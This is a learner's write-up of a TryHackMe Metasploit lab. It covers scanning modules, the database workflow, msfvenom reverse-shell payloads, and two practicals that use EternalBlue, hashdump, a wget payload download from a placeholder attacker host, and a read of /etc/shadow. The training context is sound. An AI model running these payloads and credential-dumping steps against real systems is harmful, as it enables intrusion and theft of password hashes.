
### **TryHackMe: Cyber Security 101**

**Room:** `Metasploit: Exploitation`  
**Status:** Completed  
**Date:** 2025-08-07

----------

### **Goal**

Learn to use Metasploit for scanning, vulnerability assessment, and exploitation by leveraging various modules for port scanning, service enumeration, payload generation, and post-exploitation activities.

---------

### **Key Topics Covered**


### **Key Topics Covered**

**1. Metasploit Scanning Modules**

Metasploit offers multiple scanning modules to discover open ports and services on target systems:

-   **TCP ACK Firewall Scanner:** Detects firewall presence using TCP ACK packets.
    
-   **TCP SYN Port Scanner:** Performs SYN scans to identify open ports.
    
-   **TCP Port Scanner:** Basic TCP scanning.
    
-   **XMAS Port Scanner:** Uses TCP XMAS packets for port detection.
    

Common scan options include setting concurrency, port ranges, target hosts (RHOSTS), and threading to speed up scans.

Additionally, Nmap can be run directly inside the Metasploit console, automatically saving results to the Metasploit database.

----------

**2. Service Enumeration**

-   **UDP Service Identification:** The `scanner/discovery/udp_sweep` module helps identify UDP services such as DNS and NetBIOS.
    
-   **SMB Scans:** Specific modules like `smb_enumshares` and `smb_version` allow enumeration of SMB shares and identification of SMB versions and OS details.
    
-   NetBIOS scans reveal roles like domain controllers and shared resources on networks.
    

----------

**3. Metasploit Database Integration**

Metasploit integrates with PostgreSQL to store and manage scan results and vulnerabilities.

-   Starting PostgreSQL: `systemctl start postgresql`
    
-   Initializing database: `msfdb init` (run as non-root)
    
-   Workspaces isolate projects (`workspace -a <name>`)
    

Key commands:

-   `db_nmap`: Run Nmap and save results.
    
-   `hosts`: List hosts.
    
-   `services`: List discovered services.
    
-   `vulns`: List identified vulnerabilities.
    

----------

**4. Exploitation Workflow**

-   Search for exploits using `search <service>`.
    
-   Set payloads (e.g., Meterpreter, Reverse Shell, Bind Shell).
    
-   Configure options (`set payload`, `set LHOST`, etc.).
    
-   Launch exploits with `run` or `exploit`.
    

----------

**5. Payload Generation with Msfvenom**

Msfvenom is used to create payloads across platforms:

-   Linux ELF example:  
    `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf`
    
-   Windows EXE example:  
    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe`
    
-   PHP example:  
    `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php`
    

Encoders only encode payloads but do not guarantee antivirus evasion. More advanced obfuscation or shellcode injection techniques are preferable.

----------

**6. Handlers**

Handlers catch incoming connections from reverse shells or Meterpreter sessions initiated by payloads. Using the multi/handler module, attackers listen for incoming connections to "catch" shells from exploited targets.

----------

### **Practical 1: Exploiting a Critical Vulnerability**

**Questions:**

-   Exploit one of the critical vulnerabilities on the target VM.
    
-   What is the content of the `flag.txt` file?
    
-   What is the NTLM hash of the password of the user "pirate"?
    

**How I Did It:**

-   Used the EternalBlue exploit to gain access to the victim machine.
    
-   After creating a session, backgrounded the initial shell with `CTRL + Z`.
    
-   Upgraded the shell to Meterpreter using `sessions -u 1`.
    
-   Interacted with Meterpreter using `sessions -i 2`.

-   Cat'd out the contents of Flag.txt once found    
-   Executed `hashdump` to dump NTLM password hashes, including the one for user "pirate".
    
-   Accessed the `flag.txt` file to retrieve its contents.

### **Practical 2: Creating and Deploying a Meterpreter Payload on Linux**

**Questions:**

-   Create a Meterpreter payload in `.elf` format on the attacking machine.
    
-   Transfer it to the target machine.
    
-   Get a Meterpreter session on the target machine.
    
-   Use a post-exploitation module to dump hashes of other users on the system.
    
-   What is the other user's password hash?
    

**How I Did It:**

1.  Opened three terminal tabs on my attack machine.
    
2.  SSH’d into the victim machine with the provided credentials.
    
3.  Created a Meterpreter payload in ELF format using `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
4.  Made the payload executable with `chmod 777 rev_shell.elf`.
5.  Started a Python web server on the attacking machine using `python3 -m http.server 9000`
6. Downloaded the payload on the victim machine using `wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf`
7. Opened Metasploit in another terminal tab, set up the `multi/handler` exploit, configured `LHOST`, `LPORT` (matching payload), and set the payload to `linux/x86/meterpreter/reverse_tcp`.
8. Ran the exploit and waited for a connection.
9. Executed the payload on the victim machine to trigger the reverse shell.
10. Caught the reverse shell and established a Meterpreter session.
 11.  Attempted to run `post/linux/gather/hashdump` but it failed.
    12.  Manually navigated to `/etc/shadow` and viewed password hashes with `cat /etc/shadow`.

-----

### **What I Learned**

-   The differences and use cases for multiple Metasploit scanning modules.
    
-   How to enumerate services on targets, including UDP and SMB.
    
-   The process of initializing and using Metasploit’s database and workspaces.
    
-   Step-by-step exploitation flow: searching exploits, setting payloads, and launching attacks.
    
-   How to generate payloads for different platforms using msfvenom.
    
-   The importance of handlers in managing reverse shell connections.
    
-   Practical skills in upgrading shells and extracting credentials post-exploitation.
    
-   Techniques for payload delivery using simple HTTP servers.
    
-   Alternatives when post-exploitation modules fail, such as manual file inspection.






